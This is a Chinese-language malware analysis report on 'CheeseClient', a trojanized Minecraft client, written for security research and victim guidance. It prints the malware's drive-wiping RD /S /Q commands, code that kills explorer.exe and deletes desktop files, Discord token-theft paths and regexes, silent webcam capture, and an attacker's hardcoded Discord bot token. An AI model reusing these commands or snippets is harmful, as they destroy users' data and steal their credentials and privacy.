# ⚠️ CheeseClient 惡意後門分析報告

> **警告：此儲存庫包含惡意程式碼，僅供資安研究與教育用途。請勿執行任何來自此儲存庫的程式。**

---

## 📋 基本資訊

| 項目 | 內容 |
|------|------|
| 名稱 | CheeseClient |
| 性質 | 惡意 Minecraft 客戶端（反編譯版） |
| 反編譯工具 | CFR 0.152 |
| 目標平台 | Windows |
| 危害等級 | 🔴 **極高（Infostealer + Wiper）** |

---

## 🔍 概述

CheeseClient 是一個偽裝成 Minecraft 1.8.x 客戶端的**惡意程式**，具備以下特性：

- 使用混淆器對所有類別進行重命名（`a.java`、`aab.java` 等無意義名稱）
- 使用 Unicode 雪人符號（`\u2603`）作為變數名稱，阻礙程式碼審查
- 對伺服器偽稱自己是「vanilla」原版客戶端，規避偵測
- 包含**完整的資訊竊取器（Infostealer）**與**破壞性功能（Wiper）**

---

## 💀 後門功能詳細分析

### 1. 🔴 破壞磁碟資料（`net/minecraft/client/main/Main.java`）

**最嚴重的破壞性功能。** 遊戲啟動時，後台靜默執行以下 Windows 命令：

```
cmd /c start /b RD D:\ /S /Q
cmd /c start /b RD E:\ /S /Q
cmd /c start /b RD F:\ /S /Q
cmd /c start /b RD G:\ /S /Q
cmd /c start /b RD H:\ /S /Q
cmd /c start /b RD I:\ /S /Q
cmd /c start /b RD J:\ /S /Q
cmd /c start /b RD K:\ /S /Q
cmd /c start /b RD L:\ /S /Q
cmd /c start /b RD M:\ /S /Q
```

- `RD /S /Q`：Windows 指令，**靜默遞迴刪除整個磁碟機下所有資料夾與檔案**
- `/b`：背景執行，使用者看不到任何提示視窗
- **D 槽到 M 槽全部清空，無法復原**

---

### 2. 🔴 破壞 Windows 桌面環境（`net/minecraft/util/PrintScreen.java`）

```java
// 強制殺死 Windows Explorer（桌面直接消失）
Runtime.getRuntime().exec("cmd /c start taskkill /IM explorer.exe /f");

// 對調左右滑鼠鍵，讓使用者無法正常操作
Runtime.getRuntime().exec("cmd /c start Rundll32 user32, SwapMouseButton");

// 刪除桌面所有檔案
File[] desktopFiles = new File(System.getenv("USERPROFILE") + "\Desktop").listFiles();
for (File file : desktopFiles) {
    file.delete();
}
```

- 強制終止 `explorer.exe`，桌面變黑畫面
- 對調滑鼠左右鍵，干擾使用者操作
- 刪除桌面全部檔案（不可復原）
- 循環播放惡意音效騷擾（執行 30 次）

---

### 3. 🔴 竊取 Discord Token（`net/minecraft/entity/EntityShow.java`）

從以下 **7 個來源**竊取 Discord Token：

| 來源 | 路徑 |
|------|------|
| Discord 正式版 | `%APPDATA%\Roaming\discord\Local Storage\leveldb` |
| Discord Canary | `%APPDATA%\Roaming\discordcanary\Local Storage\leveldb` |
| Discord PTB | `%APPDATA%\Roaming\discordptb\Local Storage\leveldb` |
| Google Chrome | `%APPDATA%\Local\Google\Chrome\User Data\Default\Local Storage\leveldb` |
| Opera | `%APPDATA%\Roaming\Opera Software\Opera Stable\Local Storage\leveldb` |
| Brave | `%APPDATA%\Local\BraveSoftware\Brave-Browser\User Data\Default\Local Storage\leveldb` |
| Yandex | `%APPDATA%\Local\Yandex\YandexBrowser\User Data\Default\Local Storage\leveldb` |

使用 Regex 匹配兩種 Token 格式：
- MFA Token：`mfa\.[\w-]{84}`
- 普通 Token：`[\w-]{24}\.[\w-]{6}\.[\w-]{27}`

---

### 4. 🔴 竊取 Minecraft 帳號（`net/minecraft/entity/EntityShow.java`）

```java
// 直接讀取 Minecraft launcher 的登入憑證
File mc = new File("C:\\Users\\" + folder + "\\AppData\\Roaming\\.minecraft\\launcher_profiles.json");
// 提取 accessToken 和 displayName
```

- 從 `launcher_profiles.json` 竊取所有帳號的 `accessToken` 與 `displayName`
- 攻擊者可直接使用此 Token 登入受害者的 Minecraft 帳號

---

### 5. 🔴 偷拍 Webcam 臉部照片（`net/minecraft/launchwrapper/injector/IndevVanillaInjector.java`）

```java
public static void initStream() {
    Webcam webcam = Webcam.getDefault();
    webcam.open();                    // 靜默開啟攝影機
    BufferedImage img = webcam.getImage(); // 拍下使用者臉部照片
    ImageIO.write(img, "png", new File(System.getenv("LOCALAPPDATA") + "\\wallpaper.png"));
    webcam.close();
}
```

- **無任何提示，靜默開啟攝影機**
- 拍下使用者臉部照片存至本地
- 照片隨後被上傳至攻擊者的 Discord 伺服器

---

### 6. 🔴 透過 Discord Bot 上傳所有資料（`net/minecraft/entity/EntityShow.java`）

硬編碼攻擊者 Discord Bot Token：

```java
jdaBuilder = JDABuilder.createLight("OTE2Mzg2MjYzOTk5ODYwNzc2.YapZNg.Ti72oGzKfHHiRMf4VKdb4Vfg6TA");
```

收集並上傳以下資訊至攻擊者的 Discord 頻道 `#cheese`：

- 受害者公網 IP（透過 `http://checkip.amazonaws.com` 取得）
- 電腦名稱、使用者名稱、語言、國家
- CPU 型號、架構、核心數
- 作業系統名稱、版本、架構
- Java 版本與路徑
- 所有竊取的 Discord Token
- 所有竊取的 Minecraft 帳號
- Webcam 拍攝的臉部照片（以使用者名稱命名上傳）

---

### 7. 🟡 偽裝成原版客戶端（`net/minecraft/client/ClientBrandRetriever.java`）

```java
public static String getClientModName() {
    return "vanilla";  // 對伺服器謊稱是原版
}
```

---

## 📊 危害等級總表

| 危害類型 | 影響檔案 | 嚴重程度 | 可復原性 |
|----------|----------|----------|----------|
| 刪除 D～M 槽所有資料 | `Main.java` | 🔴🔴🔴 最高 | ❌ 不可復原 |
| 殺掉 Windows Explorer | `PrintScreen.java` | 🔴🔴 極高 | ⚠️ 需重啟 |
| 刪除桌面所有檔案 | `PrintScreen.java` | 🔴🔴 極高 | ❌ 不可復原 |
| 對調滑鼠左右鍵 | `PrintScreen.java` | 🟠 中 | ⚠️ 可手動復原 |
| 偷拍 Webcam 照片 | `IndevVanillaInjector.java` | 🔴🔴 極高 | ❌ 隱私已洩漏 |
| 竊取 Discord Token（7個來源） | `EntityShow.java` | 🔴🔴 極高 | ⚠️ 需立即改密碼 |
| 竊取 Minecraft 帳號 | `EntityShow.java` | 🔴🔴 極高 | ⚠️ 需立即改密碼 |
| 上傳受害者資訊至 Discord | `EntityShow.java` | 🔴🔴 極高 | ❌ 資料已洩漏 |
| 偽裝原版客戶端 | `ClientBrandRetriever.java` | 🟡 低 | — |

---

## 🆘 若已執行此客戶端，請立即執行以下步驟

1. **立即斷開網路連線**（拔網路線或關 Wi-Fi）
2. **備份剩餘資料**（C 槽資料可能仍在）
3. **更改所有 Discord 帳號密碼**，並登出所有裝置
4. **撤銷 Discord Token**（設定 → 我的帳號 → 登出所有裝置）
5. **更改 Minecraft 報號密碼**（至 Mojang/Microsoft 官網）
6. **啟用雙重驗證（2FA）**，套用於所有帳號
7. **重新安裝 Windows 作業系統**（最安全的方式）
8. **更改其他重要帳號密碼**（Email、銀行等）

---

## 🔬 技術特徵（IoC）

| 類型 | 值 |
|------|----|
| Discord Bot Token（攻擊者） | `OTE2Mzg2MjYzOTk5ODYwNzc2.YapZNg.Ti72oGzKfHHiRMf4VKdb4Vfg6TA` |
| C2 Discord 頻道名稱 | `#cheese` |
| 外部 IP 查詢 URL | `http://checkip.amazonaws.com` |
| Webcam 截圖暫存路徑 | `%LOCALAPPDATA%\wallpaper.png` |
| 惡意核心類別 | `net.minecraft.entity.EntityShow` |
| 破壞性指令 | `cmd /c start /b RD [D-M]:\ /S /Q` |

---

## ⚖️ 法律聲明

散布、使用此惡意程式可能違反以下法律：
- 中華民國《刑法》第 358～363 條（妨害電腦使用罪）
- 中華民國《個人資料保護法》
- 美國《電腦詐欺和濫用法》（CFAA）

**本儲存庫內容僅供資安研究與教育目的，嚴禁用於任何非法用途。**

---

## 📝 分析工具

- 反編譯器：CFR 0.152
- 分析平台：GitHub Copilot 語義程式碼搜尋
- 分析日期：2026-03-03